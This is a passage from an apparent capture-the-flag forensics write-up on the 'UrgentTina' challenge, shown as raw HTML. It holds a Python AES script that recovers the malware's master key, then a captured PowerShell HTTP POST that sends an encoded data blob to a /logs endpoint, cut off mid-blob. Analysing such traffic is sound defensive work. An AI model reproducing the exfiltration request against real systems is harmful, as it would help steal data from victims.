\"0009190924win-ho5dpb1fvndadministrator\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">masterEncryptionKey \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decrypt_aes(encryptedAesKey, derivedKeyFromDateTime) \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">print\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(masterEncryptionKey)\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"from Crypto.Hash import SHA256\nfrom Crypto.Cipher import AES\nimport base64\n\ndef decrypt_aes(ciphertext, key):\n    hashed_key = SHA256.new(key.encode(&#x27;utf-8&#x27;)).digest()\n    \n    enc_bytes = base64.b64decode(ciphertext)\n    \n    iv = enc_bytes[:16]\n    cipher_strings = enc_bytes[16:]\n    \n    cipher = AES.new(hashed_key, AES.MODE_CBC, iv)\n    decrypted = cipher.decrypt(cipher_strings)\n    \n    decrypted = decrypted.rstrip(b&#x22;\\0&#x22;)\n    return decrypted.decode(&#x27;utf-8&#x27;)\n\nencryptedAesKey = &#x22;fQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ&#x22; \nderivedKeyFromDateTime = &#x22;0009190924win-ho5dpb1fvndadministrator&#x22; \nmasterEncryptionKey = decrypt_aes(encryptedAesKey, derivedKeyFromDateTime) \nprint(masterEncryptionKey)\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">python \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">u \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"e:\\CTF\\UrgentTina SVATTT\\AESDecrypt.py\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">YaMfem0zr4jdiZsDUxv1TH69\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"python -u &#x22;e:\\CTF\\UrgentTina SVATTT\\AESDecrypt.py&#x22;\nYaMfem0zr4jdiZsDUxv1TH69\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>Finally we got \u003Ccode>$masterEncryptionKey: YaMfem0zr4jdiZsDUxv1TH69\u003C/code> now\u003C/p>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"logs\">\u003Ch4 id=\"logs\">Logs\u003C/h4>\n\u003Cp>We only need to decrypt the logs that were sent to endpoint \u003Cspan class=\"katex\">\u003Cspan class=\"katex-mathml\">\u003Cmath xmlns=\"http://www.w3.org/1998/Math/MathML\">\u003Csemantics>\u003Cmrow>\u003Cmn>7\u003C/mn>\u003Cmi>C\u003C/mi>\u003Cmi>i\u003C/mi>\u003Cmi>B\u003C/mi>\u003Cmo>:\u003C/mo>\u003C/mrow>\u003Cannotation encoding=\"application/x-tex\">7CiB:\u003C/annotation>\u003C/semantics>\u003C/math>\u003C/span>\u003Cspan class=\"katex-html\" aria-hidden=\"true\">\u003Cspan class=\"base\">\u003Cspan class=\"strut\" style=\"height:0.6833em;\">\u003C/span>\u003Cspan class=\"mord\">7\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C\u003C/span>\u003Cspan class=\"mord mathnormal\">i\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B\u003C/span>\u003Cspan class=\"mspace\" style=\"margin-right:0.2778em;\">\u003C/span>\u003Cspan class=\"mrel\">:\u003C/span>\u003C/span>\u003C/span>\u003C/span>UFX/logs\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-08_01-06.png)\r\n\u003Cem>HTTP Stream\u003C/em>\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"http\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"http\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">POST\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> /logs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">HTTP\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">/\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1.1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">User-Agent\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Content-Type\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> application/x-www-form-urlencoded\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Host\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 192.168.240.1:443\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#024C1A;--shiki-dark:#72F088\">Content-Length\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">:\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 5700\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">kVGdwlncj5WZgc3buBycpByZwpmLy_TYykjN4_jYjNWO1YTM3cjNmJmZxgjMmFWZycjN5Y2X1cTO4YDOzIjM5kzMzoHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZwpmLtFmb0VWa2x1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagcGcq5iN1QzN5ATMt0WY0NXLuFWYpR3chJWZz1ycsVGelBHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZuBnLtlWbcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnauADM0gHMwQzXmdjYzoXLNpGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpBiZkBnLzVmc1R3YlRXaoNmch9FZuF2XzRnbl1WZylWdxVmcfNnbvlGdhJXZkl2cu92YfNWZTR1bJ9Ve0lmc1NWZz9FVvl_XzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL581ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdugzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL281ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyUzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyQzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduADNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyMzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Ny81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyIzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5Gcus2YhxmYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnaugzYyMTMmdzYkJWNykjMzAjMxkTY0QDMhRWY5MjNxQWYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnau42X1MjM5QzNyITO3IjN4kjN0IjM28FOzMTN4MjM4IjMwcDMzIzXzMjM4YzM4QjMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5GcuQWZ1YDN4UzYjZTMxgTNkNGZhFTNzMjY4cDZ1UWYiNTMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyW\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"POST /logs HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237\nContent-Type: application/x-www-form-urlencoded\nHost: 192.168.240.1:443\nContent-Length: 5700\n\nkVGdwlncj5WZgc3buBycpByZwpmLy_TYykjN4_jYjNWO1YTM3cjNmJmZxgjMmFWZycjN5Y2X1cTO4YDOzIjM5kzMzoHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZwpmLtFmb0VWa2x1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagcGcq5iN1QzN5ATMt0WY0NXLuFWYpR3chJWZz1ycsVGelBHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZuBnLtlWbcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnauADM0gHMwQzXmdjYzoXLNpGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpBiZkBnLzVmc1R3YlRXaoNmch9FZuF2XzRnbl1WZylWdxVmcfNnbvlGdhJXZkl2cu92YfNWZTR1bJ9Ve0lmc1NWZz9FVvl_XzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL581ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdugzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL281ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyUzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyQzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduADNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyMzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSX